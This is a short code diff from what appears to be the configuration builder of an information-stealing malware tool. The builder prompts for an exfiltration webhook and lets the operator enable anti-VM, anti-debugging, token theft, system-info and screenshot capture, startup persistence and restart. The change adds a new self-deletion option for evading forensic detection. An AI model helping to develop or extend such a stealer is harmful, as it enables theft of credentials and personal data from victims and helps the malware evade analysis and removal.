@@ -78,7 +78,7 @@ def get_user_input():
         h00k = console.input("Enter Your Webhook:", prefix="?", color="bright_magenta")
 
     options = {}
-    for key in ["anti_vm", "anti_debug", "token", "systeminfo", "screenshot", "startup", "restart"]: 
+    for key in ["anti_vm", "anti_debug", "token", "systeminfo", "screenshot", "startup", "restart", "self_delete"]: 
         val = console.input(f"Enable {key.replace('_', ' ').title()}? (y/n):", prefix="?", color="bright_magenta")
         options[key] = val.lower() == 'y'
 
